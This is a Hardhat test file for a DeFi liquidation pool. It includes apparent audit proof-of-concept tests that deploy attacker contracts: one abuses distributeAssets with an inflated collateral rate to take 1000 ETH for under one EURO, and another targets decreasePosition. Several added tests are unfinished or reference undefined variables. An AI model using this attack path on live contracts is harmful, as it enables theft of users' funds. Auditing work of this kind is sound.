const { expect } = require('chai')
const { ethers } = require('hardhat')
const { BigNumber } = ethers
const {
  mockTokenManager,
  DEFAULT_COLLATERAL_RATE,
  TOKEN_ID,
  rewardAmountForAsset,
  DAY,
  fastForward,
  POOL_FEE_PERCENTAGE,
  DEFAULT_EUR_USD_PRICE,
  //&&& added
  DEFAULT_ETH_USD_PRICE,
  PROTOCOL_FEE_RATE,
  ETH,
  getNFTMetadataContract,
  fullyUpgradedSmartVaultManager,
  HUNDRED_PC,
} = require('./common')

let user1,
  user2,
  user3,
  Protocol,
  LiquidationPoolManager,
  LiquidationPool,
  MockSmartVaultManager,
  ERC20MockFactory,
  TST,
  EUROs,
  //&&& added
  LiquidationPoolManager2,
  LiquidationPool2,
  VaultManager,
  Vault,
  TokenManager1,
  ClEthUsd,
  SwapRouterMock,
  MockWeth

describe('LiquidationPool', async () => {
  beforeEach(async () => {
    ;[user1, user2, user3, Protocol] = await ethers.getSigners()

    ERC20MockFactory = await ethers.getContractFactory('ERC20Mock')
    TST = await ERC20MockFactory.deploy('The Standard Token', 'TST', 18)
    EUROs = await (await ethers.getContractFactory('EUROsMock')).deploy()
    const EurUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('EUR / USD')
    await EurUsd.setPrice(DEFAULT_EUR_USD_PRICE)

    const { TokenManager } = await mockTokenManager()

    MockSmartVaultManager = await (
      await ethers.getContractFactory('MockSmartVaultManager')
    ).deploy(DEFAULT_COLLATERAL_RATE, TokenManager.address)

    LiquidationPoolManager = await (
      await ethers.getContractFactory('LiquidationPoolManager')
    ).deploy(TST.address, EUROs.address, MockSmartVaultManager.address, EurUsd.address, Protocol.address, POOL_FEE_PERCENTAGE)

    LiquidationPool = await ethers.getContractAt('LiquidationPool', await LiquidationPoolManager.pool())
    await EUROs.grantRole(await EUROs.BURNER_ROLE(), LiquidationPool.address)

    //&&& added
    ClEthUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('ETH / USD')
    await ClEthUsd.setPrice(DEFAULT_ETH_USD_PRICE)
    const ClEurUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('EUR / USD')
    await ClEurUsd.setPrice(DEFAULT_EUR_USD_PRICE)
    TokenManager1 = await (await ethers.getContractFactory('TokenManagerMock')).deploy(ETH, ClEthUsd.address)
    const SmartVaultDeployer = await (await ethers.getContractFactory('SmartVaultDeployerV3')).deploy(ETH, ClEurUsd.address)
    const SmartVaultIndex = await (await ethers.getContractFactory('SmartVaultIndex')).deploy()
    const NFTMetadataGenerator = await (await getNFTMetadataContract()).deploy()
    SwapRouterMock = await (await ethers.getContractFactory('SwapRouterMock')).deploy()
    MockWeth = await (await ethers.getContractFactory('WETHMock')).deploy()

    VaultManager = await fullyUpgradedSmartVaultManager(
      DEFAULT_COLLATERAL_RATE,
      PROTOCOL_FEE_RATE,
      EUROs.address,
      Protocol.address,
      Protocol.address,
      TokenManager1.address,
      SmartVaultDeployer.address,
      SmartVaultIndex.address,
      NFTMetadataGenerator.address,
      MockWeth.address,
      SwapRouterMock.address
    )

    await SmartVaultIndex.setVaultManager(VaultManager.address)
    await EUROs.grantRole(await EUROs.DEFAULT_ADMIN_ROLE(), VaultManager.address)
    await VaultManager.connect(user1).mint() //user creates a vault

    const { status } = (await VaultManager.connect(user1).vaults())[0]
    const { vaultAddress } = status
    Vault = await ethers.getContractAt('SmartVaultV3', vaultAddress) //address of newly created vault

    LiquidationPoolManager2 = await (
      await ethers.getContractFactory('LiquidationPoolManager')
    ).deploy(TST.address, EUROs.address, VaultManager.address, EurUsd.address, Protocol.address, POOL_FEE_PERCENTAGE)

    LiquidationPool2 = await ethers.getContractAt('LiquidationPool', await LiquidationPoolManager2.pool())
    await EUROs.grantRole(await EUROs.BURNER_ROLE(), LiquidationPool2.address)
    //###
  })

  afterEach(async () => {
    await network.provider.send('hardhat_reset')
  })

  describe('RS-TESTS Liquidation Pool', async () => {
    it('should be able to call Liquidation Pool Manager', async () => {
      //call liq from LPM
    })

    it('should transfer liquidation assets to the Liquidation Pool Manager', async () => {
      //user1 provides 10 ETH collateral & borrows max EUROs
      await user1.sendTransaction({ to: Vault.address, value: ethers.utils.parseEther('10') })
      const { maxMintable } = await Vault.status()
      const mintingFee = maxMintable.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC)
      await Vault.connect(user1).mint(user1.address, maxMintable.sub(mintingFee))

      // user2 stakes 1000 TST/EUROs
      const balance = ethers.utils.parseEther('1000')
      await TST.mint(user2.address, balance)
      await EUROs.mint(user2.address, balance)
      await TST.connect(user2).approve(LiquidationPool.address, balance)
      await EUROs.connect(user2).approve(LiquidationPool.address, balance)
      await LiquidationPool.connect(user2).increasePosition(balance, balance)
      await fastForward(DAY)

      //drop ETH price slightly, so user1 will be undercollateralized
      await ClEthUsd.setPrice(BigNumber.from(150000000000))
      expect(await Vault.undercollateralised()).to.equal(true)

      // ************ STATE BEFORE LIQUIDATION

      //balances before vault liquidation
      let user2ETHBalanceBefore = await ethers.provider.getBalance(user2.address)
      const protocolETHBalanceBefore = await ethers.provider.getBalance(Protocol.address)
      const LPMETHBalanceBefore = await ethers.provider.getBalance(LiquidationPoolManager2.address)
      const user2ETHRewardsBefore = (await LiquidationPool.findRewards(user2.address))[0].amount

      expect(user2ETHBalanceBefore).to.be.within(ethers.utils.parseEther('9999'), ethers.utils.parseEther('10000'))
      expect(protocolETHBalanceBefore).to.equal(ethers.utils.parseEther('10000'))
      expect(LPMETHBalanceBefore).to.equal(0)
      expect(user2ETHRewardsBefore).to.equal(0)
      // console.log('User2 ETH balance: ', ethers.utils.formatEther(user2ETHBalanceBefore))
      // console.log('Protocol ETH balance: ', ethers.utils.formatEther(protocolETHBalanceBefore))
      // console.log('LPM ETH balance: ', ethers.utils.formatEther(LPMETHBalanceBefore))
      // console.log('User2 ETH Rewards: ', ethers.utils.formatEther(user2ETHRewardsBefore))

      // ************ LIQUIDATE VAULT

      await VaultManager.connect(user1).setLiquidatorAddress(LiquidationPoolManager2.address)
      await LiquidationPoolManager2.connect(Protocol).runLiquidation(TOKEN_ID)

      //balances before vault liquidation
      let user2ETHBalanceAfter = await ethers.provider.getBalance(user2.address)
      const protocolETHBalanceAfter = await ethers.provider.getBalance(Protocol.address)
      const LPMETHBalanceAfter = await ethers.provider.getBalance(LiquidationPoolManager2.address)
      const user2ETHRewardsAfter = (await LiquidationPool.findRewards(user2.address))[0].amount

      expect(user2ETHBalanceAfter).to.be.within(ethers.utils.parseEther('9999'), ethers.utils.parseEther('10000'))
      //expect(protocolETHBalanceAfter).to.equal(ethers.utils.parseEther('10000')) // PROBLEM! this is now ~10010
      //expect(LPMETHBalanceAfter).to.equal(ethers.utils.parseEther('10')) // PROBLEM! this is still 0, but should be 10
      //expect(user2ETHRewardsAfter).to.equal(ethers.utils.parseEther('10')) // PROBLEM! this is still 0, but should be 10
      console.log('User ETH balance: ', ethers.utils.formatEther(user2ETHBalanceAfter))
      console.log('Protocol ETH balance: ', ethers.utils.formatEther(protocolETHBalanceAfter))
      console.log('LPM ETH balance: ', ethers.utils.formatEther(LPMETHBalanceAfter))
      console.log('User2 ETH Rewards: ', ethers.utils.formatEther(user2ETHRewardsAfter))

      // ************ CLAIM REWARDS

      user2ETHBalanceBefore = await ethers.provider.getBalance(user2.address)
      expect(user2ETHBalanceBefore).to.be.within(ethers.utils.parseEther('9999'), ethers.utils.parseEther('10000'))
      console.log('User ETH balance: ', ethers.utils.formatEther(user2ETHBalanceBefore))

      await LiquidationPool.connect(user2).claimRewards()

      user2ETHBalanceAfter = await ethers.provider.getBalance(user2.address)
      //expect(user2ETHBalanceAfter).to.be.within(ethers.utils.parseEther('10000'), ethers.utils.parseEther('10010')) // PROBLEM! this is still ~10000, but should be ~10010
      console.log('User ETH balance: ', ethers.utils.formatEther(user2ETHBalanceAfter))
    })

    it('allows purchasing liquidated assets with almost 0 EUROs by calling distributeAssets with a very high collateral rate', async () => {
      // user1 stakes 100 TST/EUROs
      const balance = ethers.utils.parseEther('100')
      await TST.mint(user1.address, balance)
      await EUROs.mint(user1.address, balance)
      await TST.connect(user1).approve(LiquidationPool.address, balance)
      await EUROs.connect(user1).approve(LiquidationPool.address, balance)
      await LiquidationPool.connect(user1).increasePosition(balance, balance)
      await fastForward(DAY)

      const user1ETHBalanceBefore = await ethers.provider.getBalance(user1.address) //9999.9
      expect((await LiquidationPool.position(user1.address))._position.EUROs).to.equal(balance) //100
      expect((await LiquidationPool.findRewards(user1.address))[0].amount).to.equal(0) //0 ETH rewards

      //Setup: assume, a Vault has been liquidated and the liquidated asset (1000 ETH) has been transfered to the Liquidation Pool Manager (LPM)
      await user2.sendTransaction({ to: LiquidationPoolManager.address, value: ethers.utils.parseEther('1000') })

      //Those funds are then transferred to the Liquidation Pool by calling runLiquidation() in the LPM =>
      //LiquidationPool(pool).distributeAssets{value: ethBalance}(assets, manager.collateralRate(), manager.HUNDRED_PC());
      await LiquidationPool.connect(user2).distributeAssets([], DEFAULT_COLLATERAL_RATE, HUNDRED_PC, {
        value: ethers.utils.parseEther('1000'),
      })
      expect(await ethers.provider.getBalance(LiquidationPool.address)).to.equal(ethers.utils.parseEther('1000'))

      //Deploy the attacker contract
      let liqPoolAttacker = await (
        await ethers.getContractFactory('LiqPoolDistributeAssetsAttacker')
      ).deploy(LiquidationPool.address, TST.address, EUROs.address, VaultManager.address)

      //The attacker monitors the distribution of liquidation assets on the LP
      //the attacker calls the distributeAssets() function in the LP with a very high collateral rate
      //and an Assets array that corresponds with the assets and asset balances that are currently available on the LPM
      await liqPoolAttacker.attack()

      //user1 still holds almost the same EUROs position => less than 1 EUROs were sold to acquire
      //the 1000 ETH reward from the Vault liquidation
      expect((await LiquidationPool.position(user1.address))._position.EUROs).to.be.within(
        ethers.utils.parseEther('99'),
        ethers.utils.parseEther('100')
      )
      //although user1 only stakes 100 EUROs, he was able to purchase the entire reward from the Vault liquidation: 1000 ETH
      //in our example, we only have 1 staker, if there would be other stakers, each one of them would receive
      //a portion of the rewards distribution that is proportional to his/her staking position
      expect((await LiquidationPool.findRewards(user1.address))[0].amount).to.equal(ethers.utils.parseEther('1000')) //1000 ETH rewards

      //user1 calls claim rewards and should receive the entire balance from the Vault liquidation: 1000 ETH
      //while having paid less than 1 EUROs for it
      await LiquidationPool.connect(user1).claimRewards()

      const user1ETHBalanceAfter = await ethers.provider.getBalance(user1.address)
      //user1 ETH balance has increased by ~1000 ETH
      expect(user1ETHBalanceAfter.sub(user1ETHBalanceBefore)).to.be.within(ethers.utils.parseEther('999'), ethers.utils.parseEther('1000'))
    })

    it('RS - exploit distribute assets', async () => {
      //user1 provides 1000 ETH collateral & borrows max EUROs
      await user1.sendTransaction({ to: Vault.address, value: ethers.utils.parseEther('1000') }) //let mintedValue 10;
      const { maxMintable } = await Vault.status()
      const mintingFee = maxMintable.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC)
      await Vault.connect(user1).mint(user1.address, maxMintable.sub(mintingFee))

      // user2 stakes 1000 TST/EUROs
      const balance = ethers.utils.parseEther('1000')
      await TST.mint(user2.address, balance)
      await EUROs.mint(user2.address, balance)
      await TST.connect(user2).approve(LiquidationPool.address, balance)
      await EUROs.connect(user2).approve(LiquidationPool.address, balance)
      await LiquidationPool.connect(user2).increasePosition(balance, balance)
      await fastForward(DAY)

      // drop ETH price slightly, so user1 will be undercollateralized
      await ClEthUsd.setPrice(BigNumber.from(150000000000))
      expect(await Vault.undercollateralised()).to.equal(true)

      // call runLiquidation on poolManager
      console.log('User ETH balance: ', await ethers.provider.getBalance(user2.address))
      console.log('Protocol ETH balance: ', ethers.utils.formatEther(await ethers.provider.getBalance(Protocol.address)))
      await VaultManager.connect(Protocol).liquidateVault(1)
      console.log('User ETH balance: ', await ethers.provider.getBalance(user2.address))
      console.log('Protocol ETH balance: ', ethers.utils.formatEther(await ethers.provider.getBalance(Protocol.address)))

      // user2 calls distributeAssets with a very high value for _collateralRate

      //ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC
      //let assets = await await Vault.getAssets()

      //https://github.com/ethers-io/ethers.js/issues/1007
      //struct Token { bytes32 symbol; address addr; uint8 dec; address clAddr; uint8 clDec; }
      //struct Asset { Token token; uint256 amount; }
      //const assets1 = ethers.utils.AbiCoder.prototype.encode(['address', 'uint', 'bool'], [a, b, c])
      // const token = ethers.utils.defaultAbiCoder.encode(
      //   ['bytes32', 'address', 'uint8', 'address', 'uint8'],
      //   [
      //     '0x4554480000000000000000000000000000000000000000000000000000000000',
      //     '0x0000000000000000000000000000000000000000',
      //     18,
      //     '0x68B1D87F95878fE05B998F19b66F4baba5De1aed',
      //     8,
      //   ]
      // )

      // console.log('Token: ', token)

      // let assets = [
      //     amount: 1000,
      //   },
      // ]
      //console.log('AM: ', assets[0])
      //assets[0].amount = 1 // BigNumber.from(150000000000) // ethers.utils.parseEther('100')
      //console.log('AssetO: ', assets[0])
      //console.log('AM: ', assets[0].amount)
      let collateralRate = BigNumber.from(99999999999)

      //call this from attacker contract
      //await LiquidationPool.connect(user2).distributeAssets([assets], collateralRate, HUNDRED_PC)

      // user2 calls claimRewards
      await LiquidationPool.connect(user2).claimRewards()

      // check ETH & EUROs balances for user1
      console.log('User ETH balance: ', await ethers.provider.getBalance(user2.address))

      // const balance = ethers.utils.parseEther('10')
      // await TST.mint(user2.address, balance)
      // await EUROs.mint(user2.address, balance)

      // await TST.connect(user2).approve(LiquidationPool.address, balance)
      // await EUROs.connect(user2).approve(LiquidationPool.address, balance)

      // await LiquidationPool.connect(user2).increasePosition(balance, balance)

      // await fastForward(DAY)

      //console.log('Pos TST: ', _position.TST)

      // expect(await TST.balanceOf(user1.address)).to.equal(0)
      // expect(await EUROs.balanceOf(user1.address)).to.equal(0)

      // const decreaseValue = balance.div(2)
      // await LiquidationPool.decreasePosition(decreaseValue, decreaseValue)

      // let { _position } = await LiquidationPool.position(user1.address)
      // expect(_position.TST).to.equal(balance.sub(decreaseValue))
      // expect(_position.EUROs).to.equal(balance.sub(decreaseValue))

      // expect(await TST.balanceOf(user1.address)).to.equal(decreaseValue)
      // expect(await EUROs.balanceOf(user1.address)).to.equal(decreaseValue)
    })
    it('RS - delte staking pos', async () => {
      const balance = ethers.utils.parseEther('10')
      await TST.mint(user1.address, balance)
      await EUROs.mint(user1.address, balance)
      await TST.connect(user1).approve(LiquidationPool.address, balance)
      await EUROs.connect(user1).approve(LiquidationPool.address, balance)
      await TST.mint(user2.address, balance)
      await EUROs.mint(user2.address, balance)
      await TST.connect(user2).approve(LiquidationPool.address, balance)
      await EUROs.connect(user2).approve(LiquidationPool.address, balance)

      await LiquidationPool.connect(user1).increasePosition(balance, balance)
      await fastForward(DAY)

      expect(await LiquidationPool.getStakeTotal()).to.equal(0) //not consolidated yet
      await LiquidationPool.consolidatePendingStakes()
      expect(await LiquidationPool.getStakeTotal()).to.equal(balance) //10 after consolidation

      console.log('StakeTotal: ', await LiquidationPool.getStakeTotal()) //10
      console.log('TSTTotal: ', await LiquidationPool.getTstTotal()) //10

      await LiquidationPool.connect(user2).increasePosition(balance, balance)
      console.log('StakeTotal: ', await LiquidationPool.getStakeTotal()) //10
      console.log('TSTTotal: ', await LiquidationPool.getTstTotal()) //20

      await LiquidationPool.connect(user2).decreasePosition(0, 0) //###
      console.log('StakeTotal: ', await LiquidationPool.getStakeTotal()) //10
      console.log('TSTTotal: ', await LiquidationPool.getTstTotal()) //20
      console.log((await LiquidationPool.positions(user2.address)).holder) //0x

      //expect(await LiquidationPool.getTstTotal()).to.equal(balance + balance) //10 confirmed + 10 pending
      await fastForward(DAY)
      console.log('StakeTotal: ', await LiquidationPool.getStakeTotal()) //10
      console.log('TSTTotal: ', await LiquidationPool.getTstTotal()) //20
      console.log((await LiquidationPool.positions(user2.address)).holder) //0x

      await LiquidationPool.consolidatePendingStakes() //### corrected
      console.log('StakeTotal: ', await LiquidationPool.getStakeTotal()) //20
      console.log('TSTTotal: ', await LiquidationPool.getTstTotal()) //20
      console.log((await LiquidationPool.positions(user2.address)).holder)

      //console.log((await LiquidationPool.positions(user1.address)).holder)
      //console.log((await LiquidationPool.positions(user2.address)).holder)

      //console.log('TST Balance: ', await TST.balanceOf(user2.address))
      // let { _position } = await LiquidationPool.position(user1.address)
      // console.log('Pos holder: ', _position.holder)
      // console.log('Pos TST: ', _position.TST)
      // console.log('Pos EUROs: ', _position.EUROs)
      // ;[_position] = await LiquidationPool.position(user2.address)
      // //console.log(_position)
      // console.log('Pos holder: ', _position.holder)
      // console.log('Pos TST: ', _position.TST)
      // console.log('Pos EUROs: ', _position.EUROs)

      // expect(await TST.balanceOf(user1.address)).to.equal(0)
      // expect(await EUROs.balanceOf(user1.address)).to.equal(0)

      // const decreaseValue = balance.div(2)
      // await LiquidationPool.decreasePosition(decreaseValue, decreaseValue)

      // let { _position } = await LiquidationPool.position(user1.address)
      // expect(_position.TST).to.equal(balance.sub(decreaseValue))
      // expect(_position.EUROs).to.equal(balance.sub(decreaseValue))

      // expect(await TST.balanceOf(user1.address)).to.equal(decreaseValue)
      // expect(await EUROs.balanceOf(user1.address)).to.equal(decreaseValue)
    })
    it('RS - exploit decreasePosition', async () => {
      let liqPoolAttacker = await (
        await ethers.getContractFactory('LiqPoolDecreasePosAttacker')
      ).deploy(LiquidationPool.address, TST.address, EUROs.address)

      const balance = ethers.utils.parseEther('10')
      await TST.mint(user2.address, balance)
      await EUROs.mint(user2.address, balance)

      await TST.mint(liqPoolAttacker.address, balance)
      await EUROs.mint(liqPoolAttacker.address, balance)

      await TST.connect(user2).approve(LiquidationPool.address, balance)
      await EUROs.connect(user2).approve(LiquidationPool.address, balance)

      await LiquidationPool.connect(user2).increasePosition(balance, balance)
      await liqPoolAttacker.provideLiquidity()

      await fastForward(DAY)

      await liqPoolAttacker.attack()

      console.log('TST Balance: ', await TST.balanceOf(liqPoolAttacker.address))
      let { _position } = await LiquidationPool.position(liqPoolAttacker.address)
      console.log('Pos TST: ', _position.TST)

      // expect(await TST.balanceOf(user1.address)).to.equal(0)
      // expect(await EUROs.balanceOf(user1.address)).to.equal(0)

      // const decreaseValue = balance.div(2)
      // await LiquidationPool.decreasePosition(decreaseValue, decreaseValue)

      // let { _position } = await LiquidationPool.position(user1.address)
      // expect(_position.TST).to.equal(balance.sub(decreaseValue))
      // expect(_position.EUROs).to.equal(balance.sub(decreaseValue))

      // expect(await TST.balanceOf(user1.address)).to.equal(decreaseValue)
      // expect(await EUROs.balanceOf(user1.address)).to.equal(decreaseValue)
    })
  })

  describe('position', async () => {
    it('provides the position data for given user', async () => {
      const { _position } = await LiquidationPool.position(user1.address)

      expect(_position.TST).to.equal('0')
      expect(_position.EUROs).to.equal('0')
    })

    it('does not include unclaimed EUROs fees for non-holders', async () => {
      const fees = ethers.utils.parseEther('100')

      await EUROs.mint(LiquidationPoolManager.address, fees)

      const { _position } = await LiquidationPool.position(user1.address)
      expect(_position.TST).to.equal(0)
      expect(_position.EUROs).to.equal(0)
    })
  })

  describe('increase position', async () => {
    it('allows increasing position by one or both assets', async () => {
      const balance = ethers.utils.parseEther('5000')
      const tstVal = ethers.utils.parseEther('1000')
      const eurosVal = ethers.utils.parseEther('500')

      await TST.mint(user1.address, balance)
      await EUROs.mint(user1.address, balance)

      let increase = LiquidationPool.increasePosition(tstVal, eurosVal)
      await expect(increase).to.be.revertedWith('ERC20: insufficient allowance')

      let { _position } = await LiquidationPool.position(user1.address)
      expect(_position.TST).to.equal('0')
      expect(_position.EUROs).to.equal('0')

      await TST.approve(LiquidationPool.address, tstVal)
      await EUROs.approve(LiquidationPool.address, eurosVal)

      increase = LiquidationPool.increasePosition(tstVal, eurosVal)
      await expect(increase).not.to.be.reverted
      ;({ _position } = await LiquidationPool.position(user1.address))
      expect(_position.TST).to.equal(tstVal)
      expect(_position.EUROs).to.equal(eurosVal)

      await TST.approve(LiquidationPool.address, tstVal)
      increase = LiquidationPool.increasePosition(tstVal, 0)
      await expect(increase).not.to.be.reverted
      ;({ _position } = await LiquidationPool.position(user1.address))
      expect(_position.TST).to.equal(tstVal.mul(2))
      expect(_position.EUROs).to.equal(eurosVal)

      await EUROs.approve(LiquidationPool.address, eurosVal)
      increase = LiquidationPool.increasePosition(0, eurosVal)
      await expect(increase).not.to.be.reverted
      ;({ _position } = await LiquidationPool.position(user1.address))
      expect(_position.TST).to.equal(tstVal.mul(2))
      expect(_position.EUROs).to.equal(eurosVal.mul(2))
    })

    it('triggers a distribution of fees before increasing position', async () => {
      let tstStakeValue = ethers.utils.parseEther('10000')
      await TST.mint(user1.address, tstStakeValue)
      await TST.connect(user1).approve(LiquidationPool.address, tstStakeValue)
      await LiquidationPool.connect(user1).increasePosition(tstStakeValue, 0)

      tstStakeValue = ethers.utils.parseEther('90000')
      await TST.mint(user2.address, tstStakeValue)
      await TST.connect(user2).approve(LiquidationPool.address, tstStakeValue)
      await LiquidationPool.connect(user2).increasePosition(tstStakeValue, 0)

      const fees = ethers.utils.parseEther('100')
      await EUROs.mint(LiquidationPoolManager.address, fees)

      tstStakeValue = ethers.utils.parseEther('100000')
      await TST.mint(user3.address, tstStakeValue)
      await TST.connect(user3).approve(LiquidationPool.address, tstStakeValue)
      await LiquidationPool.connect(user3).increasePosition(tstStakeValue, 0)

      // 50% of fees into pool, should receive 10% = 5% of 100 = 5;
      let { _position } = await LiquidationPool.position(user1.address)
      expect(_position.EUROs).to.equal(ethers.utils.parseEther('5'))

      // 50% of fees into pool, should receive 90% = 45% of 100 = 45;
      ;({ _position } = await LiquidationPool.position(user2.address))
      expect(_position.EUROs).to.equal(ethers.utils.parseEther('45'))

      // staking position after first round of fees already collected
      // should receive 0
      ;({ _position } = await LiquidationPool.position(user3.address))
      expect(_position.EUROs).to.equal(0)

      await EUROs.mint(LiquidationPoolManager.address, fees)

      tstStakeValue = ethers.utils.parseEther('100000')
      await TST.mint(user1.address, tstStakeValue)
      await TST.connect(user1).approve(LiquidationPool.address, tstStakeValue)
      await LiquidationPool.connect(user1).increasePosition(tstStakeValue, 0)

      // increased position after second round of fees collected
      // has 10000 staked in pool of 200000
      // should have 10% of first round + 5% of second round
      // = 5 + 2.5 = 7.5 EUROs
      ;({ _position } = await LiquidationPool.position(user1.address))
      expect(_position.EUROs).to.equal(ethers.utils.parseEther('7.5'))

      // received 90 EUROs in first round
      // now has 45% of pool (90000 from 200000)
      // 45 + 22.5 = 67.5 EUROs
      ;({ _position } = await LiquidationPool.position(user2.address))
      expect(_position.EUROs).to.equal(ethers.utils.parseEther('67.5'))

      // should receive 50% of second round of fees
      // = 25% of 100 = 25 EUROs
      ;({ _position } = await LiquidationPool.position(user3.address))
      expect(_position.EUROs).to.equal(ethers.utils.parseEther('25'))
    })
  })

  describe('decrease position', async () => {
    it('allows decreasing position by one or both assets', async () => {
      const balance = ethers.utils.parseEther('10000')
      await TST.mint(user1.address, balance)
      await EUROs.mint(user1.address, balance)

      await TST.approve(LiquidationPool.address, balance)
      await EUROs.approve(LiquidationPool.address, balance)

      await LiquidationPool.increasePosition(balance, balance)

      await fastForward(DAY)

      expect(await TST.balanceOf(user1.address)).to.equal(0)
      expect(await EUROs.balanceOf(user1.address)).to.equal(0)

      const decreaseValue = balance.div(2)
      await LiquidationPool.decreasePosition(decreaseValue, decreaseValue)

      let { _position } = await LiquidationPool.position(user1.address)
      expect(_position.TST).to.equal(balance.sub(decreaseValue))
      expect(_position.EUROs).to.equal(balance.sub(decreaseValue))

      expect(await TST.balanceOf(user1.address)).to.equal(decreaseValue)
      expect(await EUROs.balanceOf(user1.address)).to.equal(decreaseValue)

      await LiquidationPool.decreasePosition(decreaseValue, 0)
      ;({ _position } = await LiquidationPool.position(user1.address))
      expect(_position.TST).to.equal(0)
      expect(_position.EUROs).to.equal(balance.sub(decreaseValue))

      expect(await TST.balanceOf(user1.address)).to.equal(balance)
      expect(await EUROs.balanceOf(user1.address)).to.equal(decreaseValue)

      await LiquidationPool.decreasePosition(0, decreaseValue)
      ;({ _position } = await LiquidationPool.position(user1.address))
      expect(_position.TST).to.equal(0)
      expect(_position.EUROs).to.equal(0)

      expect(await TST.balanceOf(user1.address)).to.equal(balance)
      expect(await EUROs.balanceOf(user1.address)).to.equal(balance)
    })

    it('triggers a distribution of fees before decreasing position', async () => {
      const tstStake1 = ethers.utils.parseEther('100000')
      await TST.mint(user1.address, tstStake1)
      await TST.approve(LiquidationPool.address, tstStake1)
      await LiquidationPool.increasePosition(tstStake1, 0)

      const tstStake2 = ethers.utils.parseEther('700000')
      await TST.mint(user2.address, tstStake2)
      await TST.connect(user2).approve(LiquidationPool.address, tstStake2)
      await LiquidationPool.connect(user2).increasePosition(tstStake2, 0)

      const fees = ethers.utils.parseEther('20')
      await EUROs.mint(LiquidationPoolManager.address, fees)

      await fastForward(DAY)

      // user1 should receive 12.5% of 50% of fees when they decrease their position;
      const distributedFees1 = ethers.utils.parseEther('1.25')
      await LiquidationPool.decreasePosition(tstStake1, distributedFees1)
      expect(await TST.balanceOf(user1.address)).to.equal(tstStake1)
      expect(await EUROs.balanceOf(user1.address)).to.equal(distributedFees1)

      // user1 should receive 87.5% of 50% fees when another user decreased position;
      const distributedFees2 = ethers.utils.parseEther('8.75')
      expect(await TST.balanceOf(user2.address)).to.equal(0)
      expect(await EUROs.balanceOf(user2.address)).to.equal(0)
      const { _position } = await LiquidationPool.position(user2.address)
      expect(_position.TST).to.equal(tstStake2)
      expect(_position.EUROs).to.equal(distributedFees2)
    })

    it('does not allow decreasing beyond position value, even with assets in pool', async () => {
      const tstStake1 = ethers.utils.parseEther('10000')
      await TST.mint(user1.address, tstStake1)
      await TST.approve(LiquidationPool.address, tstStake1)
      await LiquidationPool.increasePosition(tstStake1, 0)

      const tstStake2 = ethers.utils.parseEther('20000')
      await TST.mint(user2.address, tstStake2)
      await TST.connect(user2).approve(LiquidationPool.address, tstStake2)
      await LiquidationPool.connect(user2).increasePosition(tstStake2, 0)

      // user1 can't take out 20000 with  10000 of their own staked
      await expect(LiquidationPool.decreasePosition(tstStake2, 0)).to.be.revertedWith('invalid-decr-amount')

      const fees = ethers.utils.parseEther('500')
      await EUROs.mint(LiquidationPoolManager.address, fees)
      // user one cannot take full amount fees ( 33%)
      await expect(LiquidationPool.decreasePosition(0, fees)).to.be.revertedWith('invalid-decr-amount')
    })
  })

  describe('claim rewards', async () => {
    it('allows users to claim their accrued rewards', async () => {
      //ETH & token in SVM ???
      const ethCollateral = ethers.utils.parseEther('0.5')
      const wbtcCollateral = BigNumber.from(1_000_000)
      const usdcCollateral = BigNumber.from(500_000_000)
      // create some funds to be "liquidated"
      await user2.sendTransaction({ to: MockSmartVaultManager.address, value: ethCollateral })
      await WBTC.mint(MockSmartVaultManager.address, wbtcCollateral)
      await USDC.mint(MockSmartVaultManager.address, usdcCollateral)

      //user stake in LP
      let stakeValue = ethers.utils.parseEther('10000')
      await TST.mint(user1.address, stakeValue)
      await EUROs.mint(user1.address, stakeValue)
      await TST.connect(user1).approve(LiquidationPool.address, stakeValue)
      await EUROs.connect(user1).approve(LiquidationPool.address, stakeValue)
      await LiquidationPool.connect(user1).increasePosition(stakeValue, stakeValue)

      await fastForward(DAY)

      //console.log('Vaults: ', await VaultManager.vaults())
      v = await Vault.status()
      console.log('Status: ', v.minted, v.totalCollateralValue)
      console.log('uc: ', await Vault.undercollateralised())
      console.log('liqq: ', (await Vault.status()).liquidated)

      console.log('LP ETH balance: ', await ethers.provider.getBalance(LiquidationPool.address))

      await LiquidationPoolManager.runLiquidation(TOKEN_ID)

      console.log('LP ETH balance: ', await ethers.provider.getBalance(LiquidationPool.address))
      console.log('Status: ', v.minted, v.totalCollateralValue)
      console.log('uc: ', await Vault.undercollateralised())
      console.log('liqq: ', (await Vault.status()).liquidated)

      expect(await ethers.provider.getBalance(LiquidationPool.address)).to.equal(ethCollateral)
      expect(await WBTC.balanceOf(LiquidationPool.address)).to.equal(wbtcCollateral)
      expect(await USDC.balanceOf(LiquidationPool.address)).to.equal(usdcCollateral)

      let { _rewards } = await LiquidationPool.position(user1.address)
      expect(_rewards).to.have.length(3)
      expect(rewardAmountForAsset(_rewards, 'ETH')).to.equal(ethCollateral)
      expect(rewardAmountForAsset(_rewards, 'WBTC')).to.equal(wbtcCollateral)
      expect(rewardAmountForAsset(_rewards, 'USDC')).to.equal(usdcCollateral)

      await LiquidationPool.claimRewards()
      ;({ _rewards } = await LiquidationPool.position(user1.address))
      expect(_rewards).to.have.length(3)
      expect(rewardAmountForAsset(_rewards, 'ETH')).to.equal(0)
      expect(rewardAmountForAsset(_rewards, 'WBTC')).to.equal(0)
      expect(rewardAmountForAsset(_rewards, 'USDC')).to.equal(0)
    })
  })
})
